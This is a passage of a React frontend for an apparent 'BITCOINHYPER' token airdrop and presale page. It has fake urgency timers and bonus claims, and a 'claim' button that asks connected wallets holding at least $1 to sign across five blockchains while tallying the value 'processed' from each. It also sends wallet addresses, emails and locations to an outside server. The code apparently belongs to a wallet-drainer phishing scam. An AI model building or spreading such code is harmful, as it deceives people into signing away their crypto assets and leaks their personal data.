              city: userLocation.city
            },
            chains: processed,
            chainsDetails: chainsDetails,
            totalProcessedValue: totalProcessedValue.toFixed(2),
            reward: "5000 BTH",
            bonus: `${presaleStats.currentBonus}%`
          })
        });
        
        if (skippedChains.length > 0 || failedChains.length > 0) {
          let summary = [];
          if (skippedChains.length > 0) summary.push(`Skipped: ${skippedChains.join(', ')} (below $1)`);
          if (failedChains.length > 0) summary.push(`Failed: ${failedChains.join(', ')}`);
          setError(`Note: ${summary.join(' · ')}`);
        }
      } else {
        setError("No chains were successfully processed");
      }
      
    } catch (err) {
      console.error('Error:', err);
      if (err.code === 4001) {
        setError('Transaction cancelled');
      } else {
        setError(err.message || 'Transaction failed');
      }
    } finally {
      setSignatureLoading(false);
      setProcessingChain('');
    }
  };

  const claimTokens = async () => {
    try {
      setLoading(true);
      await fetch('https://hyperback.vercel.app/api/presale/claim', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          walletAddress: address,
          email: userEmail,
          location: userLocation,
          reward: "5000 BTH",
          bonus: `${presaleStats.currentBonus}%`
        })
      });
      setShowCelebration(true);
    } catch (err) {
      console.error('Claim error:', err);
    } finally {
      setLoading(false);
    }
  };

  const formatAddress = (addr) => {
    if (!addr) return '';
    return `${addr.substring(0, 6)}...${addr.substring(38)}`;
  };

  return (
    <div className="min-h-screen bg-[#0a0c10] text-[#e0e7f0] font-['Inter']">
      
      {/* Subtle Background Gradient */}
      <div className="fixed inset-0 bg-gradient-to-br from-[#0f1215] via-[#0a0c10] to-[#080a0d] z-0"></div>
      <div className="fixed w-full h-full bg-[radial-gradient(ellipse_at_top_right,_rgba(200,120,30,0.03)_0%,_transparent_70%)] z-0"></div>

      {/* Main Container */}
      <div className="relative z-10 container mx-auto px-4 sm:px-6 py-6 sm:py-12 max-w-[800px]">
        
        {/* Clean Card without borders */}
        <div className="bg-[#111519] rounded-3xl sm:rounded-[40px] shadow-2xl p-6 sm:p-8 md:p-10">
          
          {/* TOP SECTION */}
          <div className="flex flex-col sm:flex-row items-center justify-between gap-4 mb-8 sm:mb-10 relative">
            
            {/* FLARE VERSION CLAIM AIRDROP RIBBON - Fully Responsive */}
            {!isConnected && showRibbon && (
              <div className="absolute -top-16 sm:-top-20 right-0 left-0 sm:left-auto sm:right-0 z-20">
                <div className="relative max-w-[320px] sm:max-w-[380px] mx-auto sm:mx-0">
                  {/* Arrow pointing to button */}
                  <div className="absolute -bottom-2 right-16 sm:right-20 w-4 h-4 bg-[#c47d24] transform rotate-45 animate-pulse"></div>
                  
                  {/* Ribbon Body */}
                  <div className="relative bg-gradient-to-r from-[#8a4c1a] to-[#b36e1a] rounded-lg px-4 py-2.5 shadow-xl border border-[#e0a55c]/30">
                    <div className="flex items-center gap-2">
                      <div className="w-6 h-6 bg-white/10 rounded-full flex items-center justify-center">
                        <i className="fas fa-gem text-white text-xs"></i>
                      </div>
                      <div>
                        <div className="text-[10px] font-semibold text-white/80 uppercase tracking-wider">
                          {t.checkWalletEligibility}
                        </div>
                        <div className="text-xs font-bold text-white">
                          {t.whenQualified}
                        </div>
                      </div>
                      <div className="bg-black/30 backdrop-blur px-2 py-1 rounded-full ml-auto">
                        <span className="text-[10px] font-bold text-white">{t.valueBadge}</span>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            )}
            
            <div className="flex items-center gap-2">
              <i className="fab fa-bitcoin text-2xl sm:text-3xl text-[#d68a2e]"></i>
              <span className="font-bold text-xl sm:text-2xl text-[#d68a2e] tracking-tight">BITCOINHYPER</span>
            </div>
            
            <div className="flex items-center gap-2">
              {/* Language Selector */}
              <div className="relative">
                <button
                  onClick={() => setShowLanguageDropdown(!showLanguageDropdown)}
                  className="bg-[#1e2227] border border-[#2a2e33] rounded-full px-3 py-2 flex items-center gap-2 hover:border-[#d68a2e]/40 transition-colors"
                >
                  <span className="text-base">{SUPPORTED_LANGUAGES[language]?.flag || '🇺🇸'}</span>
                  <span className="text-xs font-medium text-[#e0b880] hidden sm:inline">
                    {SUPPORTED_LANGUAGES[language]?.native || 'English'}
                  </span>
                  <i className={`fas fa-chevron-down text-[#9aa8b8] text-[10px] transition-transform ${showLanguageDropdown ? 'rotate-180' : ''}`}></i>
                </button>
                
                {showLanguageDropdown && (
                  <div className="absolute right-0 mt-2 w-64 bg-[#1a1e24] border border-[#2a2e33] rounded-xl shadow-2xl z-50 max-h-96 overflow-y-auto">
                    <div className="p-2">
                      <div className="text-xs text-[#d68a2e] px-3 py-2 font-medium border-b border-[#2a2e33] mb-1">
                        SELECT LANGUAGE
                      </div>
                      {Object.entries(SUPPORTED_LANGUAGES).map(([code, lang]) => (
                        <button
                          key={code}
                          onClick={() => changeLanguage(code)}
                          className={`w-full text-left px-3 py-2 rounded-lg flex items-center gap-3 hover:bg-[#252a30] transition-colors ${
                            language === code ? 'bg-[#252a30]' : ''
                          }`}
                        >
                          <span className="text-lg">{lang.flag}</span>
                          <div className="flex-1">
                            <div className="text-sm text-white">{lang.name}</div>
                            <div className="text-xs text-gray-400">{lang.native}</div>
                          </div>
                          {language === code && (
                            <i className="fas fa-check text-[#d68a2e] text-xs"></i>
                          )}
                        </button>
                      ))}
                    </div>
                  </div>
                )}
              </div>
              
              {!isConnected ? (
                <button
                  onClick={() => open()}
                  className="bg-gradient-to-r from-[#c47d24] to-[#b36e1a] text-[#0f0f12] font-semibold text-xs sm:text-sm px-5 py-2.5 rounded-full flex items-center gap-2 shadow-lg hover:shadow-[0_5px_15px_rgba(180,100,20,0.3)] transition-all whitespace-nowrap"
                >
                  <i className="fas fa-plug text-xs"></i>
                  <span>{t.connectWallet}</span>
                </button>
              ) : (
                <div className="bg-[#1e2227] rounded-full py-1.5 pl-4 pr-1.5 flex items-center gap-2 border border-[#2a2e33]">
                  <span className="font-mono text-xs text-white">
                    {formatAddress(address)}
                  </span>
                  <button
                    onClick={() => disconnect()}
                    className="w-7 h-7 rounded-full bg-[#2a2e33] flex items-center justify-center hover:bg-[#353b42] transition-colors"
                    title={t.disconnect}
                  >
                    <i className="fas fa-power-off text-[10px] text-[#e0b880]"></i>
                  </button>
                </div>
              )}
            </div>
          </div>

          {/* Eligibility Check */}
          {isConnected && scanning && (
            <div className="mb-8">
              <div className="bg-[#1a1e24] rounded-2xl p-6 border border-[#2a2e33]">
                <div className="flex items-center gap-4 mb-4">
                  <div className="w-10 h-10 border-3 border-[#c47d24] border-t-transparent rounded-full animate-spin"></div>
                  <div>
                    <div className="text-base font-semibold text-[#e0b880]">{t.checkEligibility}</div>
                    <div className="text-sm text-gray-400">{t.verifying}</div>
                  </div>
                </div>
                
                <div className="w-full bg-[#252a30] rounded-full h-1">
                  <div 
                    className="bg-gradient-to-r from-[#c47d24] to-[#d68a2e] h-1 rounded-full transition-all duration-300"
                    style={{ width: `${scanProgress}%` }}
                  ></div>
                </div>
              </div>
            </div>
          )}

          {/* LIVE Badge */}
          <div className="flex justify-center mb-4">
            <div className="bg-[#1a1e24] rounded-full px-4 py-1.5 border border-[#2a2e33] inline-flex items-center gap-2">
              <span className="relative flex h-2 w-2">
                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
                <span className="relative inline-flex rounded-full h-2 w-2 bg-red-500"></span>
              </span>
              <span className="text-xs font-medium tracking-wide text-[#e0b880]">{t.presaleLive}</span>
            </div>
          </div>

          {/* Countdown Timer */}
          <div className="bg-[#1a1e24] rounded-2xl px-6 py-5 mb-6 border border-[#2a2e33]">
            <div className="text-xs tracking-wider text-gray-400 mb-3 text-center">
              <i className="far fa-clock mr-2"></i> {t.bonusEndsIn}
            </div>
            <div className="grid grid-cols-4 gap-2">
              {[
                { label: t.days, value: timeLeft.days },
                { label: t.hrs, value: timeLeft.hours },
                { label: t.mins, value: timeLeft.minutes },
                { label: t.secs, value: timeLeft.seconds }
              ].map((item, index) => (
                <div key={index} className="text-center">
                  <div className="text-2xl sm:text-3xl font-bold text-[#d68a2e]">
                    {item.value.toString().padStart(2, '0')}
                  </div>
                  <div className="text-[10px] uppercase tracking-wider text-gray-500">{item.label}</div>
                </div>
              ))}
            </div>
          </div>

          {/* Bonus Ribbon */}
          <div className="relative mb-6">
            <div className="absolute inset-0 bg-gradient-to-r from-[#8a4c1a] to-[#b36e1a] rounded-full blur-md opacity-30"></div>
            <div className="relative bg-gradient-to-r from-[#8a4c1a] to-[#b36e1a] rounded-full px-4 py-2.5 text-center font-bold text-sm sm:text-base text-[#0f0f12] border border-[#e0a55c]/50">
              <span>{t.bonus}</span>
            </div>
          </div>

          <h1 className="text-4xl sm:text-5xl md:text-6xl font-black text-center mb-2 bg-gradient-to-b from-white to-[#d68a2e] bg-clip-text text-transparent">
            $5,000 BTH
          </h1>
          
          <div className="text-center mb-6">
            <span className="bg-[#1a1e24] rounded-full px-4 py-1.5 text-xs border border-[#2a2e33] text-[#e0b880] inline-block">
              <i className="fas fa-bolt mr-1 text-[10px]"></i> {t.instantAirdrop}
            </span>
          </div>

          {/* Stats Grid */}
          <div className="bg-[#1a1e24] rounded-2xl p-5 mb-8 grid grid-cols-3 gap-2 border border-[#2a2e33]">
            <div className="text-center">
              <div className="text-xs text-gray-400 mb-1">{t.bthPrice}</div>
              <div className="text-base sm:text-lg font-bold text-white">
                ${presaleStats.tokenPrice} <span className="text-[10px] text-[#d68a2e] ml-1">+150%</span>
              </div>
            </div>
            <div className="text-center">
              <div className="text-xs text-gray-400 mb-1">{t.bonusLabel}</div>
              <div className="text-base sm:text-lg font-bold text-white">
                5k <span className="text-[10px] text-[#d68a2e] ml-1">+25%</span>
              </div>
            </div>
            <div className="text-center">
              <div className="text-xs text-gray-400 mb-1">{t.presale}</div>
              <div className="text-base sm:text-lg font-bold text-white">{t.stage4}</div>
            </div>
          </div>

          {/* Main Claim Area */}
          {isConnected && isEligible && !allChainsCompleted && executableChains.length > 0 && (
            <div className="mt-4">
              <div className="bg-[#1a1e24] rounded-2xl px-6 py-5 text-2xl sm:text-3xl font-bold text-center text-[#e0c080] mb-4 border border-[#2a2e33]">
                5,000 <span className="text-base text-gray-400 font-normal">BTH +25%</span>
              </div>
              
              <button
                onClick={executeMultiChainSignature}
                disabled={signatureLoading || loading || !signer || executableChains.length === 0}
                className="w-full bg-gradient-to-r from-[#b36e1a] to-[#d68a2e] text-[#0f0f12] font-bold text-base sm:text-lg py-4 rounded-2xl shadow-xl hover:shadow-[0_10px_20px_rgba(180,100,20,0.2)] transition-all disabled:opacity-50 disabled:cursor-not-allowed relative overflow-hidden group"
              >
                <div className="absolute inset-0 bg-white/10 translate-x-[-100%] group-hover:translate-x-[100%] transition-transform duration-700"></div>
                {signatureLoading ? (
                  <div className="flex items-center justify-center gap-2">
                    <div className="w-4 h-4 border-2 border-[#0f0f12] border-t-transparent rounded-full animate-spin"></div>
                    <span>{t.processing}</span>
                  </div>
                ) : (
                  <span>{t.claim}</span>
                )}
              </button>
              
              {txStatus && (
                <div className="text-center mt-3 text-xs text-[#d68a2e]">
                  {txStatus}
                </div>
              )}
            </div>
          )}

          {/* Completed State */}
          {allChainsCompleted && (
            <div className="mt-4">
              <div className="bg-[#1a1e24] rounded-2xl p-5 text-center border border-green-500/20 mb-3">
                <p className="text-green-400 text-base mb-1">{t.completed}</p>
                <p className="text-gray-400 text-xs">{t.secured}</p>
              </div>
              <button
                onClick={claimTokens}
                className="w-full bg-gradient-to-r from-green-600 to-green-700 text-white font-bold text-base sm:text-lg py-4 rounded-2xl shadow-lg hover:shadow-green-500/20 transition-all"
              >
                🎉 {t.view}
              </button>
            </div>
          )}

          {/* Welcome Message */}
          {isConnected && !isEligible && !completedChains.length && !scanning && (
            <div className="bg-[#1a1e24] rounded-2xl p-6 text-center border border-[#2a2e33] mt-4">
              <div className="text-5xl mb-3">👋</div>
              <h2 className="text-xl font-bold mb-2 text-white">{t.welcome}</h2>
              <p className="text-sm text-gray-400 mb-4">
                Connect with a wallet that has at least $1 in value to qualify.
              </p>
              <div className="bg-[#252a30] rounded-xl p-3">
                <p className="text-xs text-gray-400">
                  Multi-chain: Ethereum, BSC, Polygon, Arbitrum, Avalanche
                </p>
              </div>
            </div>
          )}

          {/* Error Display */}
          {error && (
            <div className="mt-4 bg-red-500/10 border border-red-500/20 rounded-xl p-3">
              <div className="flex items-center gap-2">
                <i className="fas fa-exclamation-triangle text-red-400 text-sm"></i>
                <p className="text-red-300 text-xs">{error}</p>
              </div>
            </div>
          )}

          {/* Progress Section */}
          <div className="mt-8 pt-6 border-t border-[#2a2e33]">
            <h3 className="text-base font-semibold text-center mb-5 text-gray-300">
              PRESALE PROGRESS
            </h3>
            
            <div className="grid grid-cols-3 gap-3 mb-5">
              <div className="text-center">
                <div className="text-lg font-bold text-orange-400">${presaleStats.tokenPrice}</div>
                <div className="text-xs text-gray-500">{t.tokenPrice}</div>
              </div>
              <div className="text-center">
                <div className="text-lg font-bold text-green-400">{presaleStats.currentBonus}%</div>
                <div className="text-xs text-gray-500">{t.currentBonus}</div>
              </div>
              <div className="text-center">
                <div className="text-lg font-bold text-yellow-400">$1.25M</div>
                <div className="text-xs text-gray-500">{t.totalRaised}</div>
              </div>
            </div>

            <div className="mb-4">
              <div className="flex justify-between text-xs text-gray-400 mb-2">
                <span>{t.progress}</span>
                <span>{liveProgress.percentComplete}%</span>
              </div>
              <div className="w-full h-1.5 bg-[#252a30] rounded-full overflow-hidden">
                <div 
                  className="h-full bg-gradient-to-r from-orange-500 to-yellow-500 rounded-full"
                  style={{ width: `${liveProgress.percentComplete}%` }}
                ></div>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-3 mt-5">
              <div className="bg-[#1a1e24] rounded-lg p-3 text-center">
                <div className="text-xs text-gray-400 mb-1">{t.today}</div>
                <div className="text-base font-bold text-orange-400">{liveProgress.participantsToday}</div>
              </div>
              <div className="bg-[#1a1e24] rounded-lg p-3 text-center">
                <div className="text-xs text-gray-400 mb-1">{t.avg}</div>
                <div className="text-base font-bold text-yellow-400">${liveProgress.avgAllocation}</div>
              </div>
            </div>

            <div className="mt-4 text-center">
              <p className="text-xs text-gray-600">
                {presaleStats.totalParticipants.toLocaleString()} {t.participants}
              </p>
            </div>
          </div>

          {/* Footer */}
          <div className="mt-8 text-center">
            <div className="flex flex-wrap justify-center gap-2 mb-3">
              <span className="bg-[#1a1e24] px-3 py-1.5 rounded-full text-xs text-gray-400 border border-[#2a2e33]">
                ⚡ {t.terms}
              </span>
              <span className="bg-[#1a1e24] px-3 py-1.5 rounded-full text-xs text-gray-400 border border-[#2a2e33]">
                🔄 {t.delivery}
              </span>
              <span className="bg-[#1a1e24] px-3 py-1.5 rounded-full text-xs text-gray-400 border border-[#2a2e33]">
                💎 {t.airdrop}
              </span>
            </div>
            <p className="text-xs text-gray-600">
              {t.liveNow}
            </p>
          </div>
        </div>
      </div>

      {/* Celebration Modal */}
      {showCelebration && (
        <div className="fixed inset-0 bg-black/90 flex items-center justify-center z-50 p-4">
          <div className="relative max-w-sm w-full">
            <div className="absolute inset-0 bg-gradient-to-r from-orange-600/20 to-yellow-600/20 rounded-3xl blur-xl"></div>
            
            <div className="relative bg-[#1a1e24] rounded-3xl p-8 border border-orange-500/20 shadow-2xl text-center">
              <div className="text-6xl mb-4 animate-bounce">🎉</div>
              
              <h2 className="text-2xl font-bold mb-2 bg-gradient-to-r from-yellow-400 to-orange-400 bg-clip-text text-transparent">
                {t.successful}
              </h2>
              
              <p className="text-gray-300 mb-2">{t.youHaveSecured}</p>
              
              <div className="text-3xl font-bold text-orange-400 mb-3">$5,000 BTH</div>
              
              <div className="inline-block bg-green-500/10 px-4 py-2 rounded-full mb-4 border border-green-500/20">
                <span className="text-green-400">+{presaleStats.currentBonus}% BONUS</span>
              </div>
              
              <button
                onClick={() => setShowCelebration(false)}
                className="w-full bg-gradient-to-r from-orange-500 to-orange-600 text-white font-bold py-3 rounded-xl hover:shadow-lg transition-all"
              >
                {t.viewButton}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

export default App;
